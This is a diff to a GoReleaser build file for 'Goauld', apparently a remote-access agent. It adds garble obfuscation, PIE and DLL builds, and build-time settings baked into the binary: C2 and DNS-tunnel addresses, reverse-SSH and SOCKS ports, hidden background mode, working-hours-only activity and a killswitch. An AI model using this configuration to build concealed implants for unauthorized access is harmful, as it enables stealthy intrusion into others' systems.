@@ -221,11 +221,11 @@ before:
         #   zig build-exe agent/sshd/shell/shim_windows/sshd_shim.zig -target x86-windows -O ReleaseSmall -femit-bin=agent/sshd/shell/shimembed/sshd_shim/sshd_windows_386.exe
         #   rm -rf agent/sshd/shell/shimembed/sshd_shim/*.pdb
         # else
-        env GOOS=windows GOARCH=amd64 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_amd64.exe ./agent/sshd/shell/shim_windows/
-        env GOOS=windows GOARCH=arm64 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_arm64.exe ./agent/sshd/shell/shim_windows/
-        env GOOS=windows GOARCH=386 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_386.exe ./agent/sshd/shell/shim_windows/
+        env GOOS=windows GOARCH=amd64 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -buildmode=pie -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_amd64.exe ./agent/sshd/shell/shim_windows/
+        env GOOS=windows GOARCH=arm64 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -buildmode=pie -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_arm64.exe ./agent/sshd/shell/shim_windows/
+        env GOOS=windows GOARCH=386 {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -buildmode=pie -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_386.exe ./agent/sshd/shell/shim_windows/
         # fi
-        env GOOS=windows GOARCH=arm {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_arm.exe ./agent/sshd/shell/shim_windows/
+        env GOOS=windows GOARCH=arm {{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}CLIENT__COMPILE_SEED={{.Env.CLIENT__COMPILE_SEED}} ./scripts/garble.sh{{else}}go{{end}} build -trimpath -buildmode=pie -ldflags '-s -w -buildid=' -o agent/sshd/shell/shimembed/sshd_shim/sshd_windows_arm.exe ./agent/sshd/shell/shim_windows/
       fi"
 
 snapshot:
@@ -262,6 +262,7 @@ builds:
       - arm64
     flags:
       - -trimpath
+      - -buildmode=pie
     tags:
       - netgo
       - osusergo
@@ -315,6 +316,10 @@ builds:
     main: ./agent
     env:
       - CGO_ENABLED=0
+    hooks:
+      post:
+        # Make an UPX copy only when UPX=true
+        - cmd: sh -c 'if [ "$(printf "%s" "${COMPRESS:-false}" | tr A-Z a-z)" = "true" ]; then cp "{{ .Path }}" "{{ .Path }}.fat"; fi'
 
     goos:
       - linux
@@ -327,6 +332,7 @@ builds:
       - arm64
     flags:
       - -trimpath
+      - -buildmode=pie
     tags:
       - netgo
       - osusergo
@@ -414,7 +420,6 @@ builds:
 
 # END Dynamic AGENT
 
-      # END Dynamic SERVER
   - id: "mini_agent"
     mod_timestamp: "{{ .CommitTimestamp }}"
     tool: '{{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}{{ if eq .Runtime.Goos "windows" }}./scripts/garble.bat{{ else }}./scripts/garble.sh{{ end }}{{else}}go{{end}}'
@@ -439,12 +444,130 @@ builds:
       - arm
       - arm64
     flags:
+      - -a
       - -trimpath
+    buildmode: pie
     tags:
       - netgo
       - osusergo
       - mini
       - nethttpomithttp2
+    gcflags:
+      - -N
+      - -l
+      - -B
+      - -wb=false
+    ldflags:
+      - -s -w -buildid=
+      - '{{ if (index .Env "AGENT__PRIVATE_PASSWORD") }} -X Goauld/agent/config._private_password={{ .Env.AGENT__PRIVATE_PASSWORD }}{{end}}'
+      - '-X Goauld/common.Version={{ if (index .Env "VERSION") }}{{ .Env.VERSION }}::Tealc{{ else }}{{ .Version }}{{ end }}'
+      - '-X Goauld/common.Date={{ if (index .Env "DATE") }}{{ .Env.DATE }}{{ else }}{{ .CommitDate }}{{ end }}'
+      - '-X Goauld/common.Commit={{ if (index .Env "COMMIT") }}{{ .Env.COMMIT }}{{ else }}{{ .Commit }}{{ end }}'
+
+
+      # BEGIN Dynamic AGENT
+      - '{{ if (index .Env "AGENT__AGEPUBKEY") }} -X Goauld/agent/config._agePubKey={{ .Env.AGENT__AGEPUBKEY }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__SERVER") }} -X Goauld/agent/config._server={{ .Env.AGENT__SERVER }}{{end}}'
+      - '{{ if (index .Env "AGENT__SSH_SERVER") }} -X Goauld/agent/config._ssh_server={{ .Env.AGENT__SSH_SERVER }}{{end}}'
+      - '{{ if (index .Env "AGENT__QUIC_DOMAIN") }} -X Goauld/agent/config._quic_domain={{ .Env.AGENT__QUIC_DOMAIN }}{{end}}'
+      - '{{ if (index .Env "AGENT__TLS_SERVER") }} -X Goauld/agent/config._tls_server={{ .Env.AGENT__TLS_SERVER }}{{end}}'
+      - '{{ if (index .Env "AGENT__DNS_SERVER") }} -X Goauld/agent/config._dns_server={{ .Env.AGENT__DNS_SERVER }}{{end}}'
+      - '{{ if (index .Env "AGENT__DNS_DOMAIN") }} -X Goauld/agent/config._dns_domain={{ .Env.AGENT__DNS_DOMAIN }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__SHARED_PASSWORD") }} -X Goauld/agent/config._shared_password={{ .Env.AGENT__SHARED_PASSWORD }}{{end}}'
+      - '{{ if (index .Env "AGENT__DISABLE_PASSWORD") }} -X Goauld/agent/config._disable_password={{ .Env.AGENT__DISABLE_PASSWORD }}{{end}}'
+      - '{{ if (index .Env "AGENT__NAME") }} -X Goauld/agent/config._name={{ .Env.AGENT__NAME }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__SSHD_ENABLED") }} -X Goauld/agent/config._sshd_enabled={{ .Env.AGENT__SSHD_ENABLED }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_ENABLED") }} -X Goauld/agent/config._socks_enabled={{ .Env.AGENT__SOCKS_ENABLED }}{{end}}'
+      - '{{ if (index .Env "AGENT__HTTP_PROXY_ENABLED") }} -X Goauld/agent/config._http_proxy_enabled={{ .Env.AGENT__HTTP_PROXY_ENABLED }}{{end}}'
+      - '{{ if (index .Env "AGENT__WG_ENABLED") }} -X Goauld/agent/config._wg_enabled={{ .Env.AGENT__WG_ENABLED }}{{end}}'
+      - '{{ if (index .Env "AGENT__RELAY_ENABLED") }} -X Goauld/agent/config._relay_enabled={{ .Env.AGENT__RELAY_ENABLED }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__PROXY") }} -X Goauld/agent/config._proxy={{ .Env.AGENT__PROXY }}{{end}}'
+      - '{{ if (index .Env "AGENT__PROXY_USERNAME") }} -X Goauld/agent/config._proxy_username={{ .Env.AGENT__PROXY_USERNAME }}{{end}}'
+      - '{{ if (index .Env "AGENT__PROXY_PASSWORD") }} -X Goauld/agent/config._proxy_password={{ .Env.AGENT__PROXY_PASSWORD }}{{end}}'
+      - '{{ if (index .Env "AGENT__PROXY_DOMAIN") }} -X Goauld/agent/config._proxy_domain={{ .Env.AGENT__PROXY_DOMAIN }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__SOCKS_CUSTOM_PROXY") }} -X Goauld/agent/config._socks_custom_proxy={{ .Env.AGENT__SOCKS_CUSTOM_PROXY }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_USE_SYSTEM_PROXY") }} -X Goauld/agent/config._socks_use_system_proxy={{ .Env.AGENT__SOCKS_USE_SYSTEM_PROXY }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_PROXY_USERNAME") }} -X Goauld/agent/config._socks_proxy_username={{ .Env.AGENT__SOCKS_PROXY_USERNAME }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_PROXY_PASSWORD") }} -X Goauld/agent/config._socks_proxy_password={{ .Env.AGENT__SOCKS_PROXY_PASSWORD }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_PROXY_DOMAIN") }} -X Goauld/agent/config._socks_proxy_domain={{ .Env.AGENT__SOCKS_PROXY_DOMAIN }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__HTTP_CUSTOM_PROXY") }} -X Goauld/agent/config._http_custom_proxy={{ .Env.AGENT__HTTP_CUSTOM_PROXY }}{{end}}'
+      - '{{ if (index .Env "AGENT__HTTP_PROXY_USERNAME") }} -X Goauld/agent/config._http_proxy_username={{ .Env.AGENT__HTTP_PROXY_USERNAME }}{{end}}'
+      - '{{ if (index .Env "AGENT__HTTP_PROXY_PASSWORD") }} -X Goauld/agent/config._http_proxy_password={{ .Env.AGENT__HTTP_PROXY_PASSWORD }}{{end}}'
+      - '{{ if (index .Env "AGENT__HTTP_PROXY_DOMAIN") }} -X Goauld/agent/config._http_proxy_domain={{ .Env.AGENT__HTTP_PROXY_DOMAIN }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__NO_PROXY") }} -X Goauld/agent/config._no_proxy={{ .Env.AGENT__NO_PROXY }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__RSSH_PORT") }} -X Goauld/agent/config._rssh_port={{ .Env.AGENT__RSSH_PORT }}{{end}}'
+      - '{{ if (index .Env "AGENT__SOCKS_PORT") }} -X Goauld/agent/config._socks_port={{ .Env.AGENT__SOCKS_PORT }}{{end}}'
+      - '{{ if (index .Env "AGENT__HTTP_PORT") }} -X Goauld/agent/config._http_port={{ .Env.AGENT__HTTP_PORT }}{{end}}'
+      - '{{ if (index .Env "AGENT__WG_PORT") }} -X Goauld/agent/config._wg_port={{ .Env.AGENT__WG_PORT }}{{end}}'
+      - '{{ if (index .Env "AGENT__RELAY_PORT") }} -X Goauld/agent/config._relay_port={{ .Env.AGENT__RELAY_PORT }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__KEEPAWAKE") }} -X Goauld/agent/config._keepawake={{ .Env.AGENT__KEEPAWAKE }}{{end}}'
+      - '{{ if (index .Env "AGENT__KEEPALIVE") }} -X Goauld/agent/config._keepalive={{ .Env.AGENT__KEEPALIVE }}{{end}}'
+      - '{{ if (index .Env "AGENT__VERBOSITY") }} -X Goauld/agent/config._verbosity={{ .Env.AGENT__VERBOSITY }}{{end}}'
+      - '{{ if (index .Env "AGENT__QUIET") }} -X Goauld/agent/config._quiet={{ .Env.AGENT__QUIET }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__ONLY_WORKING_DAYS") }} -X Goauld/agent/config._only_working_days={{ .Env.AGENT__ONLY_WORKING_DAYS }}{{end}}'
+      - '{{ if (index .Env "AGENT__WORKING_DAY_START") }} -X Goauld/agent/config._working_day_start={{ .Env.AGENT__WORKING_DAY_START }}{{end}}'
+      - '{{ if (index .Env "AGENT__WORKING_DAY_END") }} -X Goauld/agent/config._working_day_end={{ .Env.AGENT__WORKING_DAY_END }}{{end}}'
+      - '{{ if (index .Env "AGENT__WORKING_DAY_TIMEZONE") }} -X Goauld/agent/config._working_day_timezone={{ .Env.AGENT__WORKING_DAY_TIMEZONE }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__RSSH_ORDER") }} -X Goauld/agent/config._rssh_order={{ .Env.AGENT__RSSH_ORDER }}{{end}}'
+      - '{{ if (index .Env "AGENT__RSSH_TIMEOUT") }} -X Goauld/agent/config._rssh_timeout={{ .Env.AGENT__RSSH_TIMEOUT }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__REMOTE_PORT_FORWARDING") }} -X Goauld/agent/config._remote_port_forwarding={{ .Env.AGENT__REMOTE_PORT_FORWARDING }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__MAX_RETRIES") }} -X Goauld/agent/config._max_retries={{ .Env.AGENT__MAX_RETRIES }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__VERSION") }} -X Goauld/agent/config._version={{ .Env.AGENT__VERSION }}{{end}}'
+      - '{{ if (index .Env "AGENT__GENERATE_CONFIG") }} -X Goauld/agent/config._generate_config={{ .Env.AGENT__GENERATE_CONFIG }}{{end}}'
+      - '{{ if (index .Env "AGENT__CONFIG_FILE") }} -X Goauld/agent/config._config_file={{ .Env.AGENT__CONFIG_FILE }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__BACKGROUND") }} -X Goauld/agent/config._background={{ .Env.AGENT__BACKGROUND }}{{end}}'
+      - '{{ if (index .Env "AGENT__HIDDEN_BACKGROUND") }} -X Goauld/agent/config._hidden_background={{ .Env.AGENT__HIDDEN_BACKGROUND }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__CUSTOM_DNS_COMMAND") }} -X Goauld/agent/config._custom_dns_command={{ .Env.AGENT__CUSTOM_DNS_COMMAND }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__KILLSWITCH") }} -X Goauld/agent/config._killswitch={{ .Env.AGENT__KILLSWITCH }}{{end}}'
+
+      - '{{ if (index .Env "AGENT__RELAY_ADDR") }} -X Goauld/agent/config._relay_addr={{ .Env.AGENT__RELAY_ADDR }}{{end}}'
+
+  # END Dynamic AGENT
+  - id: "agent-dll"
+    mod_timestamp: "{{ .CommitTimestamp }}"
+    tool: '{{ if and (index .Env "CLIENT__COMPILE_SEED") .Env.CLIENT__COMPILE_SEED }}{{ if eq .Runtime.Goos "windows" }}./scripts/garble.bat{{ else }}./scripts/garble.sh{{ end }}{{else}}go{{end}}'
+    binary: goauld
+    main: ./agent
+    buildmode: c-shared
+    hooks:
+      post:
+        # Make an UPX copy only when UPX=true
+        - cmd: sh -c 'if [ "$(printf "%s" "${COMPRESS:-false}" | tr A-Z a-z)" = "true" ]; then cp "{{ .Path }}" "{{ .Path }}.fat"; fi'
+
+    env:
+      - CGO_ENABLED=1
+    goos:
+      # - linux
+      - windows
+      # - darwin
+    goarch:
+      - amd64
+      - "386"
+      # - arm
+      - arm64
+    flags:
+      - -trimpath
+      # - -buildmode=pie
+    tags:
+      - netgo
+      - osusergo
     ldflags:
       - -s -w -buildid=
       - '{{ if (index .Env "AGENT__PRIVATE_PASSWORD") }} -X Goauld/agent/config._private_password={{ .Env.AGENT__PRIVATE_PASSWORD }}{{end}}'
@@ -529,6 +652,7 @@ builds:
 
   # END Dynamic AGENT
 
+
   - id: "client"
     mod_timestamp: "{{ .CommitTimestamp }}"
     binary: tealc
@@ -547,6 +671,7 @@ builds:
       - arm64
     flags:
       - -trimpath
+      - -buildmode=pie
     tags:
       - netgo
       - osusergo
